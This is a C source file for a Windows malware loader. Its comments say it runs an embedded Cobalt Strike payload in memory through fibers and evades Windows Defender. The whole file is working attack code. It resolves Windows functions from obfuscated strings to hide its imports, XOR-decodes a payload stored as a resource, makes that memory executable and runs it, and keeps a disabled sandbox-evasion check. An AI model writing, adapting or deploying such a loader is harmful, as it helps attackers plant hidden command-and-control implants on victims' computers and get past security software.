/**
Main functionality for loading Cobalt Strike payload in memory
using Fiber: "https://www.ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber".
CS Payload embedded as resource that needs to be decode and decrypted, before being executed.
This loader inspired from Sektor7 Maldev Intermediate course and currently bypass Windows Defender static and behaviour detection.
**/

#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <wincrypt.h>
#include <psapi.h>
#include <shlwapi.h>
#include "resolve_eat.h"
#include "resource.h"
#pragma comment(lib, "shlwapi.lib")
#pragma comment (lib, "Crypt32.lib")

typedef HRSRC(WINAPI* tFindResourceA)(
	HMODULE hModule,
	LPCSTR lpName,
	LPCSTR lpType
	);

typedef HGLOBAL(WINAPI* tLoadResource)(
	HMODULE hModule,
	HRSRC hResInfo
	);

typedef LPVOID(WINAPI* tLockResource)(
	HGLOBAL hResData
	);

typedef DWORD(WINAPI* tSizeofResource)(
	HMODULE hModule,
	HRSRC hResInfo
	);

typedef LPVOID(WINAPI* tVirtualAlloc)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD flAllocationType,
	DWORD flProtect
	);

typedef VOID(WINAPI* tCopyMemory)(
	PVOID Destination,
	const VOID * Source,
	SIZE_T Length
	);

typedef BOOL(WINAPI* tVirtualProtect)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD flNewProtect,
	PDWORD lpflOldProtect
	);

BOOL CheckSandbox(void)
{
	char lpFilename[MAX_PATH];
	DWORD nSize = sizeof(lpFilename);
	GetModuleFileNameA(NULL, lpFilename, nSize); // retrieves the path of the executable file of the current process, OUT Saves to the lpFilename variable, IN specifies the size of lpFilename (how much room GetModuleFileNameA has to work with)
	LPSTR exepath = PathFindFileNameA(lpFilename); // Searches a path for a file name. Returns a pointer to the base name of the executable from the full path.
	if (StrCmpA(exepath, "OpsImplant.exe") != 0)
	{
		return TRUE;
	}
	return FALSE;
}

void Exor(char* data, size_t data_len) {

	for (int i = 0; i < data_len; i++) {
		data[i] = data[i] ^ 123;
	}
}

int Base64Decode(const BYTE* src, unsigned int srcLen, char* dst, unsigned int dstLen) {

	DWORD outLen;
	BOOL fRet;

	outLen = dstLen;
	fRet = CryptStringToBinaryA((LPCSTR)src, srcLen, CRYPT_STRING_BASE64, (BYTE*)dst, &outLen, NULL, NULL);
	
	if (!fRet) outLen = 0;

	return(outLen);
}

VOID WINAPI start(VOID){

	/**
	//if (!CheckSandbox()) { return; }
	**/

	PVOID mem_loc;
	BOOL vprv;
	DWORD oldprotect = 0;
	HRSRC hRsrc = NULL;
	HGLOBAL hGlobal = NULL;
	PVOID pTaskAddress = NULL;
	unsigned int sTaskSize = NULL;
	
	WCHAR strmodule[] = { 'K', 'E', 'R', 'N', 'E', 'L', '3', '2', '.', 'D', 'L', 'L', '\0'};
	//size_t strmodule_len = sizeof(strmodule);
	char strVirtualAlloc[] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', '\0'};
	char strVirtualProtect[] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', '\0'};
	char strCopyMemory[] = { 'R', 't', 'l', 'M', 'o', 'v', 'e', 'M', 'e', 'm', 'o', 'r', 'y', '\0'};
	char strFindResourceA[] = {'F', 'i', 'n', 'd', 'R', 'e', 's', 'o', 'u', 'r', 'c', 'e', 'A', '\0'};
	char strLoadResource[] = { 'L', 'o', 'a', 'd', 'R', 'e', 's', 'o', 'u', 'r', 'c', 'e', '\0' };
	char strLockResource[] = { 'L', 'o', 'c', 'k', 'R', 'e', 's', 'o', 'u', 'r', 'c', 'e', '\0' };
	char strSizeofResource[] = {'S', 'i', 'z', 'e', 'o', 'f', 'R', 'e', 's', 'o', 'u', 'r', 'c', 'e', '\0' };

	//Exor(strmodule, strmodule_len);

	tVirtualAlloc fpVirtualAlloc = (tVirtualAlloc)GetFuncAddr(GetModHdl(strmodule), strVirtualAlloc);
	tVirtualProtect fpVirtualProtect = (tVirtualProtect)GetFuncAddr(GetModHdl(strmodule), strVirtualProtect);
	tCopyMemory fpCopyMemory = (tCopyMemory)GetFuncAddr(GetModHdl(strmodule), strCopyMemory);
	tFindResourceA fpFindResourceA = (tFindResourceA)GetFuncAddr(GetModHdl(strmodule), strFindResourceA);
	tLoadResource fpLoadResource = (tLoadResource)GetFuncAddr(GetModHdl(strmodule), strLoadResource);
	tLockResource fpLockResource = (tLockResource)GetFuncAddr(GetModHdl(strmodule), strLockResource);
	tSizeofResource fpSizeofResource = (tSizeofResource)GetFuncAddr(GetModHdl(strmodule), strSizeofResource);
	

	hRsrc = fpFindResourceA(NULL, MAKEINTRESOURCEA(IDR_RCDATA1), (LPCSTR) RT_RCDATA);
	if (hRsrc == NULL) {
		return;
	}

	hGlobal = fpLoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		return;
	}

	pTaskAddress = fpLockResource(hGlobal);
	if (pTaskAddress == NULL) {
		return;
	}

	sTaskSize = fpSizeofResource(NULL, hRsrc);
	if (sTaskSize == NULL) {
		return;
	}

	PVOID startFiber = ConvertThreadToFiber(NULL);

	mem_loc = fpVirtualAlloc(0, sTaskSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	//Base64Decode((const BYTE*)pTaskAddress, sTaskSize, (char*)mem_loc, sTaskSize);
	fpCopyMemory(mem_loc, pTaskAddress, sTaskSize);

	Exor((char*)mem_loc, sTaskSize);

	vprv = fpVirtualProtect(mem_loc, sTaskSize, PAGE_EXECUTE_READ, &oldprotect);

	PVOID taskFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)mem_loc, NULL);

	if (taskFiber != NULL) {
		SwitchToFiber(taskFiber);
	}
}